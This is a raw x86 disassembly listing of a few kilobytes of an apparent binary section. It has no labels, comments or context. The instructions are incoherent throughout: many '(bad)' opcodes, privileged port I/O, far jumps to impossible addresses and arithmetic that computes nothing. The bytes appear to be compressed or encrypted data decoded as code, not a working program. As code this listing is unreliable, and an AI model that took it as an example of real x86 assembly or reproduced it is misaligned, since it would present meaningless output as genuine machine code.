  419d45:	lods   eax,DWORD PTR ds:[esi]
  419d46:	bound  ecx,QWORD PTR [ebx-0x10]
  419d49:	mov    bl,BYTE PTR [ebx]
  419d4b:	sub    BYTE PTR [ebp+0x7d0eefa3],cl
  419d51:	sub    eax,0xdf462b2c
  419d56:	cli    
  419d57:	jae    0x419d10
  419d59:	int3   
  419d5a:	ins    DWORD PTR es:[edi],dx
  419d5b:	mov    edi,0x96679562
  419d60:	sub    DWORD PTR [ecx-0x5df52010],eax
  419d66:	and    al,0x5d
  419d68:	mov    BYTE PTR [ebx-0x6],al
  419d6b:	add    eax,0x315a
	...
  419dd4:	add    BYTE PTR [eax],al
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ss fcmove st,st(7)
  419de3:	add    eax,0x16678968
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	gs push ecx
  419df0:	mov    esi,0xd659e023
  419df5:	popf   
  419df6:	push   esi
  419df7:	dec    ecx
  419df8:	push   edx
  419df9:	in     al,0x42
  419dfb:	sub    eax,edx
  419dfd:	dec    edi
  419dfe:	popf   
  419dff:	add    edi,edx
  419e01:	rcl    DWORD PTR [ebx],1
  419e03:	push   edx
  419e04:	into   
  419e05:	lahf   
  419e06:	mov    dl,0x98
  419e08:	mov    WORD PTR [ecx-0x51ec73d5],?
  419e0e:	inc    edi
  419e0f:	xchg   ebp,eax
  419e10:	push   0x2c
  419e12:	push   ds
  419e13:	fiadd  WORD PTR [esi-0x27]
  419e16:	add    DWORD PTR [edx],eax
  419e18:	(bad)  
  419e19:	push   0x50cfd2fe
  419e1e:	clc    
  419e1f:	test   BYTE PTR [eax+0x2],cl
  419e22:	enter  0x965a,0x5e
  419e26:	jecxz  0x419df3
  419e28:	popa   
  419e29:	leave  
  419e2a:	pop    edi
  419e2b:	fwait
  419e2c:	daa    
  419e2d:	fisubr DWORD PTR [edi-0x2b]
  419e30:	hlt    
  419e31:	test   DWORD PTR [ecx+0x7b],0xc712e60a
  419e38:	or     bh,BYTE PTR [edi+0x2f]
  419e3b:	jae    0x419dca
  419e3d:	popa   
  419e3e:	mov    bl,0x93
  419e40:	jae    0x419dee
  419e42:	xor    al,bh
  419e44:	ins    DWORD PTR es:[edi],dx
  419e45:	mov    BYTE PTR ss:[ebp+0x39187b15],cl
  419e4c:	stos   DWORD PTR es:[edi],eax
  419e4d:	pop    ebp
  419e4e:	lds    ecx,FWORD PTR [edx-0x622409c9]
  419e54:	add    BYTE PTR [eax+0x672dccb7],dh
  419e5a:	mov    edi,0xdd438b30
  419e5f:	sbb    ah,BYTE PTR [esi]
  419e61:	dec    edx
  419e62:	aad    0xac
  419e64:	pop    es
  419e65:	sbb    al,0x96
  419e67:	mov    esp,0xa4ae1624
  419e6c:	jo     0x419ebf
  419e6e:	ins    BYTE PTR es:[edi],dx
  419e6f:	sub    BYTE PTR [ebp+0x730b3676],0x24
  419e76:	sbb    BYTE PTR [ebp-0x22],bl
  419e79:	ret    0x4541
  419e7c:	sbb    ah,ah
  419e7e:	jmp    0x1538a30b
  419e83:	(bad)  
  419e84:	pop    ss
  419e85:	adc    al,0x97
  419e87:	push   esp
  419e88:	mov    dh,0x78
  419e8a:	jbe    0x419e8e
  419e8c:	mov    al,ds:0xfdd51cd0
  419e91:	cmp    edi,ebx
  419e93:	sar    BYTE PTR [esi+0x4c],cl
  419e96:	stc    
  419e97:	or     al,0xf9
  419e99:	pop    ds
  419e9a:	test   DWORD PTR [eax-0x31],ecx
  419e9d:	jno    0x419e89
  419e9f:	mov    al,dl
  419ea1:	mov    eax,0x9cd1cb8c
  419ea6:	jbe    0x419eff
  419ea8:	(bad)  
  419ea9:	pop    ecx
  419eaa:	(bad)  
  419eab:	repz mov bh,0xd3
  419eae:	jns    0x419e6c
  419eb0:	xor    edi,esi
  419eb2:	inc    ecx
  419eb3:	out    dx,al
  419eb4:	xchg   esi,eax
  419eb5:	jno    0x419f1d
  419eb7:	xlat   BYTE PTR ds:[ebx]
  419eb8:	cmp    BYTE PTR [ebx-0x630784a7],dl
  419ebe:	ss xchg edi,eax
  419ec0:	je     0x419f22
  419ec2:	cld    
  419ec3:	pop    eax
  419ec4:	rol    DWORD PTR [edx],0x4d
  419ec7:	and    bl,ch
  419ec9:	jmp    0xe76d83fb
  419ece:	jae    0x419e7b
  419ed0:	mov    DWORD PTR [edx+edi*8-0x2d],ebx
  419ed4:	push   ebp
  419ed5:	rcl    al,cl
  419ed7:	retf   
  419ed8:	inc    esp
  419ed9:	clc    
  419eda:	fs ret 
  419edc:	push   edi
  419edd:	ins    DWORD PTR es:[edi],dx
  419ede:	cli    
  419edf:	jg     0x419ee9
  419ee1:	push   ds
  419ee2:	mov    ds:0xfadfc402,al
  419ee7:	or     BYTE PTR [esi-0x7599850],dh
  419eed:	xchg   ebx,eax
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	push   esp
  419f63:	pop    ebx
  419f64:	popa   
  419f65:	les    esp,FWORD PTR [edi+0x17]
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	repz sub al,BYTE PTR [esi]
  419f71:	repnz mov al,0x69
  419f74:	shl    al,0x2a
  419f77:	pop    ecx
  419f78:	sbb    ebx,DWORD PTR [ebp+ebx*2+0x15]
  419f7c:	aam    0xa4
  419f7e:	mov    ah,ah
  419f80:	fbstp  TBYTE PTR [ebx+esi*1+0x5bbbcd44]
  419f87:	mov    ds:0x42318670,al
  419f8c:	iret   
  419f8d:	shr    BYTE PTR [edx],1
  419f8f:	dec    eax
  419f90:	xchg   esp,eax
  419f91:	jge    0x419f3b
  419f93:	aam    0x8c
  419f95:	sbb    dl,BYTE PTR [edi+0x52]
  419f98:	add    eax,0x102bff81
  419f9d:	(bad)  [ebx]
  419f9f:	stc    
  419fa0:	inc    ebp
  419fa1:	loopne 0x41a012
  419fa3:	dec    ecx
  419fa4:	lods   eax,DWORD PTR ds:[esi]
  419fa5:	inc    ebx
  419fa6:	mov    eax,ds:0x96fc4876
  419fab:	imul   ebx
  419fad:	sahf   
  419fae:	cmp    ebp,edi
  419fb0:	loopne 0x419f62
  419fb2:	mov    eax,ds:0xeca62575
  419fb7:	jg     0x419f7d
  419fb9:	sub    BYTE PTR [eax],dh
  419fbb:	retf   
  419fbc:	inc    edx
  419fbd:	mov    BYTE PTR [edx+0x8d3a3f2],dh
  419fc3:	pop    esi
  419fc4:	popa   
  419fc5:	fimul  DWORD PTR es:[esi]
  419fc8:	nop
  419fc9:	dec    ebp
  419fca:	fdiv   QWORD PTR [bp+si-0x32b6]
  419fcf:	daa    
  419fd0:	ret    0x438e
  419fd3:	fwait
  419fd4:	lock mov al,0x2c
  419fd7:	sar    DWORD PTR [ecx],0xf3
  419fda:	push   ebx
  419fdb:	sbb    BYTE PTR [edi+0x5f7e3d3e],dl
  419fe1:	test   eax,0x8600c5bb
  419fe6:	addr16 xchg edx,eax
  419fe8:	ds xchg bl,bh
  419feb:	inc    esi
  419fec:	shl    esi,0x5d
  419fef:	in     eax,dx
  419ff0:	push   eax
  419ff1:	(bad)  [esi+eax*4-0x27f693f7]
  419ff8:	lock jns 0x419fd8
  419ffb:	jbe    0x41a05a
  419ffd:	fld    DWORD PTR ds:0xbf65c92a
  41a003:	mov    eax,0xe514dace
  41a008:	es out 0xa1,al
  41a00b:	and    BYTE PTR [edx-0x2796070a],bl
  41a011:	add    al,BYTE PTR [edx+0x713e9e87]
  41a017:	fwait
  41a018:	push   0xd590f981
  41a01d:	fst    st(4)
  41a01f:	(bad)  
  41a021:	jge    0x41a052
  41a023:	rcr    DWORD PTR [ebx+0x47],1
  41a026:	jmp    0x5e670963
  41a02b:	dec    ebp
  41a02c:	fwait
  41a02d:	aaa    
  41a02e:	das    
  41a02f:	or     DWORD PTR [ecx+0x45],edx
  41a032:	adc    al,0x93
  41a034:	cld    
  41a035:	mov    bl,BYTE PTR [eax-0x103fa775]
  41a03b:	ins    BYTE PTR es:[edi],dx
  41a03c:	dec    ebp
  41a03d:	test   BYTE PTR ds:[ebx-0x6e15260],0x10
  41a045:	aaa    
  41a046:	out    dx,al
  41a047:	xor    al,0x99
  41a049:	and    edi,DWORD PTR [edx+0x70]
  41a04c:	leave  
  41a04d:	sub    esi,DWORD PTR [ecx]
  41a04f:	jp     0x41a0cd
  41a051:	or     ecx,ebx
  41a053:	dec    ecx
  41a054:	aas    
  41a055:	sbb    ebx,ecx
  41a057:	and    DWORD PTR [edi+eiz*2],edi
  41a05a:	gs sub DWORD PTR es:[ebp+0x2e4260e0],ecx
  41a062:	mov    ah,0xf1
  41a064:	cmp    BYTE PTR ds:0x5e0bbabb,al
  41a06a:	out    dx,al
  41a06b:	xchg   edx,eax
  41a06c:	cvtps2pi mm0,QWORD PTR [eax]
	...
  41a0d3:	add    BYTE PTR [eax],al
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x4f],bh
  41a0e3:	push   0x1867b6d4
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	xor    al,BYTE PTR [ebx+0x30523ad6]
  41a0f4:	ss retf 0xc91a
  41a0f8:	ret    0xbfc5
  41a0fb:	push   esi
  41a0fc:	cmp    DWORD PTR [esi+0x77],0xfdd4dd8d
  41a103:	ds cmp BYTE PTR gs:[ebx],bl
  41a107:	ret    0x6df2
  41a10a:	ds (bad) 
  41a10c:	in     al,dx
  41a10d:	out    dx,eax
  41a10e:	pop    es
  41a10f:	retf   
  41a110:	mov    dl,0xf0
  41a112:	test   eax,0xfe1207d
  41a118:	js     0x41a14f
  41a11a:	jp     0x41a161
  41a11c:	aam    0xa8
  41a11e:	sub    ebx,edi
  41a120:	pop    ebx
  41a121:	sbb    eax,0x8b2e0b2b
  41a126:	lock shr BYTE PTR [ebx-0x26682000],cl
  41a12d:	mov    esp,0x94a6b657
  41a132:	data16 cmp BYTE PTR [esi+0x3179e48f],al
  41a139:	and    ebx,DWORD PTR [edx-0x74]
  41a13c:	and    ch,bl
  41a13e:	adc    al,0xf2
  41a140:	push   edi
  41a141:	fnstcw WORD PTR [edi+edi*8-0xa]
  41a145:	loope  0x41a1a1
  41a147:	and    BYTE PTR [ebp-0x66de42ec],al
  41a14d:	iret   
  41a14e:	xchg   ebx,eax
  41a14f:	bound  ecx,QWORD PTR es:0x2dcb6c40
  41a156:	clc    
  41a157:	mov    edx,0x459a621d
  41a15c:	dec    DWORD PTR [ecx+ebp*4-0x1f09860a]
  41a163:	pop    ebx
  41a164:	inc    ecx
  41a165:	out    0x9f,eax
  41a167:	jo     0x41a186
  41a169:	outs   dx,DWORD PTR ds:[esi]
  41a16a:	outs   dx,BYTE PTR ds:[esi]
  41a16b:	out    0xd2,al
  41a16d:	out    dx,eax
  41a16e:	mov    ?,WORD PTR [esi+0x13]
  41a171:	cmp    dh,BYTE PTR [esi+eax*4+0x694e3f9a]
  41a178:	push   ebx
  41a179:	pop    ecx
  41a17a:	leave  
  41a17b:	les    esi,FWORD PTR [ecx+eax*2-0x480110af]
  41a182:	cmp    esp,DWORD PTR [edi]
  41a184:	ficom  DWORD PTR ds:0x35727294
  41a18a:	addr16 xor eax,0x42190b62
  41a190:	jne    0x41a1dc
  41a192:	xchg   BYTE PTR [edx+0x1405e24e],bl
  41a198:	mov    ch,0x50
  41a19a:	jmp    FWORD PTR [esi]
  41a19c:	pop    ss
  41a19d:	sbb    al,0xc8
  41a1a0:	mov    edx,0xa79e035a
  41a1a5:	push   edi
  41a1a6:	mov    ah,0xe1
  41a1a8:	push   ebp
  41a1a9:	shl    BYTE PTR [eax-0x63fae623],0x8b
  41a1b0:	xchg   esp,eax
  41a1b1:	test   al,0x7d
  41a1b3:	mov    bh,0xd0
  41a1b5:	enter  0xb5c9,0x0
  41a1b9:	faddp  st(3),st
  41a1bb:	mov    al,0xd3
  41a1bd:	sub    ebp,ebx
  41a1bf:	cli    
  41a1c0:	inc    ebx
  41a1c1:	sbb    al,0x13
  41a1c3:	push   ebp
  41a1c4:	test   BYTE PTR [ecx],ch
  41a1c6:	scas   eax,DWORD PTR es:[edi]
  41a1c7:	popa   
  41a1c8:	pop    edx
  41a1c9:	and    ch,dh
  41a1cb:	sbb    BYTE PTR ds:0x521521d6,0xf8
  41a1d2:	xchg   ebx,eax
  41a1d3:	int3   
  41a1d4:	aad    0x4a
  41a1d6:	ret    
  41a1d7:	pop    edx
  41a1d8:	xor    BYTE PTR [edi+ecx*1-0x71e6c708],bl
  41a1df:	hlt    
  41a1e0:	dec    edi
  41a1e1:	mov    cl,0x64
  41a1e3:	xor    BYTE PTR [eax],dl
  41a1e5:	fsubr  QWORD PTR [ebp+0xc0a064c]
  41a1eb:	xchg   esp,eax
  41a1ec:	pop    ss
  41a1ed:	inc    ebx
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	mov    eax,ds:0x67779347
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR ds:0xde36669b,al
  41a273:	ficomp WORD PTR [edi-0x1b]
  41a276:	call   DWORD PTR [esi]
  41a278:	(bad)  [esi+0x52]
  41a27b:	arpl   WORD PTR [eax+ecx*2],si
  41a27e:	pop    eax
  41a27f:	nop
  41a280:	xchg   esp,eax
  41a281:	xchg   BYTE PTR [ecx+0x23],al
  41a284:	cmp    bl,BYTE PTR [edi+0x2f11a441]
  41a28a:	and    dl,bl
  41a28c:	mov    dl,cl
  41a28e:	mov    edi,0xb9dc1491
  41a293:	cmp    dh,BYTE PTR [ecx*2-0x6b3d598f]
  41a29a:	pop    esp
  41a29b:	jo     0x41a24d
  41a29d:	mov    edx,0x4135bd9c
  41a2a2:	hlt    
  41a2a3:	(bad)  
  41a2a4:	sub    al,0x45
  41a2a6:	icebp  
  41a2a7:	lock jecxz 0x41a311
  41a2aa:	push   cs
  41a2ab:	cwde   
  41a2ac:	das    
  41a2ad:	fisttp WORD PTR ds:0x5d423e3b
  41a2b3:	leave  
  41a2b4:	and    bl,dh
  41a2b6:	xlat   BYTE PTR es:[ebx]
  41a2b8:	xor    al,0x1e
  41a2ba:	add    esi,DWORD PTR [ecx+0x37]
  41a2bd:	adc    eax,0x720289cb
  41a2c2:	shl    edi,cl
  41a2c4:	xor    BYTE PTR [ecx+0xb9a6166],dh
  41a2ca:	sbb    eax,0x4efd9b7a
  41a2cf:	push   es
  41a2d0:	inc    eax
  41a2d1:	adc    DWORD PTR [bp+di-0x55],edx
  41a2d5:	add    BYTE PTR [ebp-0x1a0617c],al
  41a2db:	rol    BYTE PTR [esp+esi*1],cl
  41a2de:	scas   al,BYTE PTR es:[edi]
  41a2df:	pop    ebp
  41a2e0:	fs mov ch,0x95
  41a2e3:	sub    esi,DWORD PTR [eax+edx*4+0x5aa0572c]
  41a2ea:	inc    eax
  41a2eb:	faddp  st(3),st
  41a2ed:	rol    al,1
  41a2ef:	in     eax,0xc0
  41a2f1:	mov    ds:0x5adc2dca,eax
  41a2f6:	and    DWORD PTR cs:[ebp+edx*4+0x2df6d7f0],0xd7f8448f
  41a302:	outs   dx,BYTE PTR ds:[esi]
  41a303:	(bad)  
  41a304:	call   0x8720:0xd933323f
  41a30b:	pop    ss
  41a30c:	and    ch,dh
  41a30e:	mov    edi,0xacbd4c8e
  41a313:	mov    dh,0x77
  41a315:	jne    0x41a309
  41a317:	xor    ebx,DWORD PTR [ebx]
  41a319:	cmp    ecx,ebp
  41a31b:	in     al,0x4a
  41a31d:	imul   edx,DWORD PTR [esi],0x89c8f1c7
  41a323:	jo     0x41a2b8
  41a325:	daa    
  41a326:	lods   al,BYTE PTR ds:[esi]
  41a327:	dec    edi
  41a328:	stc    
  41a329:	mov    al,ds:0x15e99b4d
  41a32e:	test   BYTE PTR [ebx+0x547de43c],0x11
  41a335:	gs out 0x17,al
  41a338:	pop    eax
  41a339:	test   BYTE PTR [eax-0x4d79df3c],0x77
  41a340:	jne    0x41a32a
  41a342:	js     0x41a35e
  41a344:	lods   al,BYTE PTR ds:[esi]
  41a345:	add    al,0x92
  41a347:	out    dx,al
  41a348:	test   BYTE PTR [ecx-0x22],ah
  41a34b:	jno    0x41a3a1
  41a34d:	mov    BYTE PTR ds:0xe85d19e3,ah
  41a353:	push   edi
  41a354:	lahf   
  41a355:	adc    al,cl
  41a357:	add    esi,DWORD PTR [edi+0xb]
  41a35a:	cld    
  41a35b:	inc    ecx
  41a35c:	or     al,0x93
  41a35e:	jnp    0x41a339
  41a360:	int3   
  41a361:	imul   edx
  41a363:	xor    al,0xe7
  41a365:	mov    ah,0x82
  41a367:	std    
  41a368:	call   0xfc9cd299
  41a36d:	push   esp
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	or     dh,BYTE PTR [ecx+eax*4+0x11a6709]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [eax+0x676c8737],al
  41a3f3:	pop    esp
  41a3f4:	out    dx,al
  41a3f5:	call   0x3a6dd666
  41a3fa:	mov    edx,0x84ff11e
  41a3ff:	and    BYTE PTR [eax],ch
  41a401:	jecxz  0x41a47d
  41a403:	mov    ch,0x58
  41a405:	pop    ebp
  41a406:	or     eax,0xee8fe612
  41a40b:	or     ebx,DWORD PTR [eax]
  41a40d:	in     al,dx
  41a40e:	je     0x41a48f
  41a410:	pop    ebx
  41a411:	scas   eax,DWORD PTR es:[edi]
  41a412:	sub    al,bh
  41a414:	dec    esp
  41a415:	or     ch,ch
  41a417:	fistp  WORD PTR ds:0xaeab4b17
  41a41d:	sub    DWORD PTR [ecx],edi
  41a41f:	cs mov bl,0x91
  41a422:	mov    DWORD PTR [ecx+0x1],esp
  41a425:	inc    ebx
  41a426:	ds cs repz dec edx
  41a42a:	and    dh,cl
  41a42c:	icebp  
  41a42d:	(bad)  
  41a42e:	ins    BYTE PTR es:[edi],dx
  41a42f:	adc    BYTE PTR [edx],dh
  41a431:	xchg   edi,eax
  41a432:	std    
  41a433:	rol    ecx,1
  41a435:	js     0x41a41d
  41a437:	jo     0x41a49b
  41a439:	fisttp WORD PTR [ecx-0x4e]
  41a43c:	shl    BYTE PTR [eax+0x20],1
  41a43f:	stos   DWORD PTR es:[edi],eax
  41a440:	push   esi
  41a441:	ret    0x9f8c
  41a444:	fst    DWORD PTR [ebp-0x4b62d38c]
  41a44a:	push   ecx
  41a44b:	push   0xffffffd7
  41a44d:	pop    eax
  41a44e:	inc    edx
  41a44f:	aas    
  41a450:	xlat   BYTE PTR ds:[ebx]
  41a451:	(bad)  
  41a452:	pop    ecx
  41a453:	adc    bl,BYTE PTR [edx+0x50]
  41a456:	sub    al,0x1f
  41a458:	jg     0x41a4c3
  41a45a:	xchg   esi,eax
  41a45b:	ret    0xbcc2
  41a45e:	aaa    
  41a45f:	jbe    0x41a4dc
  41a461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a462:	jmp    0xfd15:0xc4d265e0
  41a469:	hlt    
  41a46a:	(bad)  
  41a46b:	xor    DWORD PTR [ecx],ecx
  41a46d:	dec    esp
  41a46e:	pop    esi
  41a46f:	inc    edx
  41a470:	adc    WORD PTR [ecx],si
  41a473:	sub    ebx,DWORD PTR [eax-0x31]
  41a476:	push   cs
  41a477:	mov    al,ds:0xd08434aa
  41a47c:	mov    ch,0x17
  41a47e:	imul   ebp,eax,0x1a
  41a481:	std    
  41a482:	pushf  
  41a483:	icebp  
  41a484:	sub    DWORD PTR ds:0x129d4380,0xffffffd2
  41a48b:	dec    DWORD PTR [edi+ebp*2-0x61]
  41a48f:	ins    DWORD PTR es:[edi],dx
  41a490:	aaa    
  41a491:	(bad)  
  41a493:	jns    0x41a486
  41a495:	out    dx,al
  41a496:	imul   bh
  41a498:	aad    0xf1
  41a49a:	int3   
  41a49b:	xor    al,0x73
  41a49d:	into   
  41a49e:	mov    al,ds:0xe087498d
  41a4a3:	outs   dx,BYTE PTR ds:[esi]
  41a4a4:	mov    bp,0xbd2
  41a4a8:	xor    BYTE PTR [edx],ch
  41a4aa:	xor    ebx,eax
  41a4ac:	retf   
  41a4ad:	out    dx,al
  41a4ae:	int3   
  41a4af:	enter  0x19da,0xdc
  41a4b3:	jns    0x41a529
  41a4b5:	pushf  
  41a4b6:	push   esp
  41a4b7:	push   esp
  41a4b8:	dec    esi
  41a4b9:	push   esi
  41a4ba:	leave  
  41a4bb:	inc    esi
  41a4bc:	adc    bh,BYTE PTR [edi+0x7f74efc3]
  41a4c2:	cld    
  41a4c3:	mov    ecx,0xb55457c8
  41a4c8:	aas    
  41a4c9:	ret    0x42ec
  41a4cc:	cmc    
  41a4cd:	scas   eax,DWORD PTR es:[edi]
  41a4ce:	in     al,0xa8
  41a4d0:	jae    0x41a548
  41a4d2:	jmp    0xa29f:0xe5559f42
  41a4d9:	fild   DWORD PTR [ecx-0x31]
  41a4dc:	inc    edi
  41a4dd:	call   0xb79b49e9
  41a4e2:	(bad)  
  41a4e3:	outs   dx,BYTE PTR ds:[esi]
  41a4e4:	mov    al,0x22
  41a4e6:	dec    ecx
  41a4e7:	sbb    dh,BYTE PTR [esi]
  41a4e9:	or     eax,0x9946d8ed
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	mov    dl,0xd6
  41a564:	dec    eax
  41a565:	outs   dx,DWORD PTR ds:[esi]
  41a566:	sbb    eax,DWORD PTR [bx+di]
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR [edi+0x3a09e21c],bl
  41a573:	dec    ebp
  41a574:	or     al,0x9
  41a576:	or     al,ch
  41a578:	xor    bl,BYTE PTR [eax*8+0x711c3ad0]
  41a57f:	ins    BYTE PTR es:[edi],dx
  41a580:	jb     0x41a552
  41a582:	sub    BYTE PTR [esi+0x74881834],dl
  41a588:	rep stos BYTE PTR es:[edi],al
  41a58a:	test   DWORD PTR [edx-0x32],ebp
  41a58d:	cdq    
  41a58e:	push   ebp
  41a58f:	mov    esp,0x533c3a4b
  41a594:	xor    ah,BYTE PTR [esi+0x1e2f735a]
  41a59a:	push   es
  41a59b:	mov    edx,0x15bf7fb7
  41a5a0:	ja     0x41a542
  41a5a2:	les    esi,FWORD PTR [ecx]
  41a5a4:	xor    BYTE PTR [ebx+0x4924d9bc],bl
  41a5aa:	cmp    eax,0x203ab636
  41a5af:	test   DWORD PTR gs:[edi+0x2e2f1d6f],eax
  41a5b6:	dec    esi
  41a5b7:	retf   0xeb87
  41a5ba:	pop    edi
  41a5bb:	imul   esp,edi,0xffffff88
  41a5be:	jmp    FWORD PTR [ebx]
  41a5c0:	and    cl,BYTE PTR [esi+edi*1+0x2e945577]
  41a5c7:	rcl    ebp,1
  41a5c9:	sub    eax,0xae60dbb0
  41a5ce:	clc    
  41a5cf:	test   BYTE PTR [ebp-0x3051d763],al
  41a5d5:	xchg   DWORD PTR [edi-0x25],edx
  41a5d8:	mov    gs,WORD PTR [ebx+ecx*2-0x7e7d0842]
  41a5df:	imul   eax,DWORD PTR [esi+0x3ad9c7d8],0xfffffff1
  41a5e6:	xor    BYTE PTR [edx],dh
  41a5e8:	scas   eax,DWORD PTR es:[edi]
  41a5e9:	je     0x41a5fb
  41a5eb:	lds    ebx,FWORD PTR [esi]
  41a5ed:	(bad)  
  41a5ee:	aad    0xa5
  41a5f0:	pop    esi
  41a5f1:	adc    cl,BYTE PTR [edx-0x6ba2c3d]
  41a5f7:	cld    
  41a5f8:	xor    ah,0x83
  41a5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5fc:	(bad)  
  41a5fd:	mov    ss,WORD PTR [edx-0x4a038eb4]
  41a603:	clc    
  41a604:	sbb    dh,dh
  41a606:	jmp    0x89b:0xbe3672ef
  41a60d:	fistp  QWORD PTR [edx]
  41a60f:	and    eax,ebp
  41a611:	iret   
  41a612:	mov    edx,0x924d4e47
  41a617:	lea    edx,[eax-0x64]
  41a61a:	int3   
  41a61b:	inc    ebx
  41a61c:	mov    eax,ds:0xad9f5d23
  41a621:	(bad)  
  41a622:	sti    
  41a623:	xchg   DWORD PTR [eax],ecx
  41a625:	imul   ebp,ecx,0x33d4d3d8
  41a62b:	fcomip st,st(1)
  41a62d:	popf   
  41a62e:	jbe    0x41a696
  41a630:	pop    ebx
  41a631:	scas   eax,DWORD PTR es:[edi]
  41a632:	lds    edi,FWORD PTR [ebx+eiz*4]
  41a635:	xor    BYTE PTR [eax-0x3e],ch
  41a638:	aam    0xcf
  41a63a:	xor    al,0xa
  41a63c:	or     eax,0x149291bc
  41a641:	cmc    
  41a642:	xor    ebx,DWORD PTR [ebx-0x46]
  41a645:	fistp  QWORD PTR [ecx-0xa]
  41a648:	arpl   WORD PTR [ecx-0x3b],dx
  41a64b:	scas   al,BYTE PTR es:[edi]
  41a64c:	retf   0x4e51
  41a64f:	das    
  41a650:	cs jbe 0x41a65f
  41a653:	fsub   DWORD PTR [edi+0x7f]
  41a656:	loop   0x41a60c
  41a658:	clc    
  41a659:	mov    esi,0x82066960
  41a65e:	pop    ebp
  41a65f:	sahf   
  41a660:	fs stos BYTE PTR es:[edi],al
  41a662:	ret    
  41a663:	lds    edi,FWORD PTR [eax-0x7a]
  41a666:	int3   
  41a667:	pop    DWORD PTR [edi+0x5a985524]
  41a66d:	mov    ah,0x0
	...
  41a6d3:	add    BYTE PTR [eax],al
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xf7a6a625
  41a6e4:	pop    ecx
  41a6e5:	jno    0x41a74e
  41a6e7:	sbb    al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [edi+0x3a],al
  41a6f0:	and    BYTE PTR [edi-0x67a84d10],ah
  41a6f6:	ret    
  41a6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6f8:	repz and dh,ah
  41a6fb:	aam    0x10
  41a6fd:	inc    esi
  41a6fe:	cld    
  41a6ff:	retf   
  41a700:	adc    al,0xc5
  41a702:	(bad)  
  41a703:	jo     0x41a6e6
  41a705:	dec    esi
  41a706:	stos   DWORD PTR es:[edi],eax
  41a707:	pop    eax
  41a708:	pop    es
  41a709:	jmp    0x41a72d
  41a70b:	inc    esi
  41a70c:	pop    esp
  41a70d:	rcr    DWORD PTR [eax-0x7f],cl
  41a710:	retf   0x43b9
  41a713:	and    eax,0x83231f16
  41a718:	loopne 0x41a6c6
  41a71a:	push   ebx
  41a71b:	push   ebp
  41a71c:	sahf   
  41a71d:	cld    
  41a71e:	sub    eax,0x45257fe9
  41a723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a724:	in     eax,dx
  41a725:	xchg   edi,eax
  41a726:	out    dx,al
  41a727:	into   
  41a728:	mov    edx,fs
  41a72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a72b:	outs   dx,BYTE PTR ds:[esi]
  41a72c:	push   esp
  41a72d:	xchg   ebx,eax
  41a72e:	sbb    DWORD PTR [eax+0x7630b9e9],edi
  41a734:	sub    eax,0xe2fd6005
  41a739:	jecxz  0x41a6e5
  41a73b:	push   es
  41a73c:	and    BYTE PTR [esi-0x4549e3c6],al
  41a742:	fadd   QWORD PTR ds:0x7258491e
  41a748:	repz icebp 
  41a74a:	test   al,0x84
  41a74c:	and    eax,0x7f670fca
  41a751:	jae    0x41a746
  41a753:	xor    dl,BYTE PTR [edi]
  41a755:	mov    edi,0x8e8782c8
  41a75a:	popa   
  41a75b:	fisubr DWORD PTR [ebp-0x29]
  41a75e:	repnz add ecx,ebx
  41a761:	jnp    0x41a751
  41a763:	inc    edi
  41a764:	xchg   ebp,eax
  41a765:	je     0x41a6fd
  41a767:	dec    esp
  41a768:	icebp  
  41a769:	ret    
  41a76a:	dec    ebp
  41a76b:	out    dx,al
  41a76c:	adc    eax,DWORD PTR [ebp-0xe]
  41a76f:	mov    ax,ds:0xd2141e87
  41a775:	jns    0x41a7f3
  41a777:	(bad)  
  41a778:	jl     0x41a7c6
  41a77a:	stos   DWORD PTR es:[edi],eax
  41a77b:	mov    edi,0x1af12d02
  41a780:	mov    bh,0x37
  41a782:	mov    bh,0x2
  41a784:	(bad)  
  41a786:	aaa    
  41a787:	out    dx,eax
